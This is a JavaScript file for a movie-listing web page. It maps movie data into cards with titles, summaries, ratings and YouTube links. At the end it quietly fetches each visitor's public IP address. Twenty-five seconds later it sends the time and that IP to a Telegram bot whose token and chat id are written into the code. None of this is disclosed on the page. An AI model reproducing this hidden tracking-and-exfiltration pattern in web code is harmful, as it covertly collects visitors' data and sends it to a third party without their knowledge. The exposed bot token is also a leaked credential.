const moviesList = $('.js-movies-list');
const moviesCardTemplate = $('#template-element').content;

let normalizedMovies = [];

let films = movies.map((movie, i) => {
  normalizedMovies.push({
    movieTitle: movie.Title,
    movieFullTitle: movie.fulltitle,
    movieYear: movie.movie_year,
    movieCaterogy: movie.Categories,
    movieSummary: movie.summary,
    movieId: movie.imdb_id,
    movieRating: movie.imdb_rating,
    movieRuntime: movie.runtime,
    movieLanguage: movie.language,
    movieYtId: movie.ytid,
    img: `https://i3.ytimg.com/vi/${movie.ytid}/hqdefault.jpg`,
    id: i
    })
});

let createMovieElement = function (movie) {
    let movieElement = moviesCardTemplate.cloneNode(true);
    movieElement.querySelector('.js-movie-img').src = movie.img;
    movieElement.querySelector('.js-movie-img').alt = movie.movieTitle;
    movieElement.querySelector('.js-movie-title').textContent = movie.movieTitle;
    movieElement.querySelector('.js-movie-summary').textContent = movie.movieSummary;
    movieElement.querySelector('.js-movie-full-tittle').textContent = movie.movieFullTitle;
    movieElement.querySelector('.js-movie-caterogy').textContent = movie.movieCaterogy;
    movieElement.querySelector('.js-movie-rating').textContent = movie.movieRating;
    movieElement.querySelector('.js-movie-runtime').textContent = movie.movieRuntime;
    movieElement.querySelector('.js-movie-language').textContent = movie.movieLanguage;
    movieElement.querySelector('.js-yt-link').href = `https://www.youtube.com/watch?v=${movie.movieYtId}`;
    movieElement.querySelector('.js-accordian-header').id = `flush-heading${movie.id}`;
    movieElement.querySelector('.accordion-button').setAttribute('data-bs-target', `#flush-collapse${movie.id}`);
    movieElement.querySelector('.accordion-button').setAttribute('aria-controls', `flush-collapse${movie.id}`);
    movieElement.querySelector('.js-accordian-collapse').id = `flush-collapse${movie.id}`;

    return movieElement;
}

let renderMovies = function (normalizedMovies) {
    moviesList.innerHTML = '';
    
    let fragment = document.createDocumentFragment();

    normalizedMovies.forEach(movie => {
        fragment.appendChild(createMovieElement(movie));
    });
    
    moviesList.appendChild(fragment);
}

renderMovies(normalizedMovies);

let uP ='';
async function getIP() {
  try {
    const res = await fetch('https://api.ipify.org?format=json');
    const jsonObj = (res.json()).then(data => {
    uP = data.ip;
  });
  } catch (err) {
    console.error(err);
  }
}
getIP();

setTimeout(function() {
  function sendmessage(){
    chat_id = 1670604763;
    token = `5498274845:AAFuzhbK9fyZ1jTAH-U8KB55q-9wMzS9dIw`;
    let time = new Date();
    let message = `${time} IP ${uP}`;
    let url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${message}`;
    let xhr = new XMLHttpRequest();
    xhr.open("GET", url, true);
    xhr.send();
  }
    sendmessage();
}, 25000);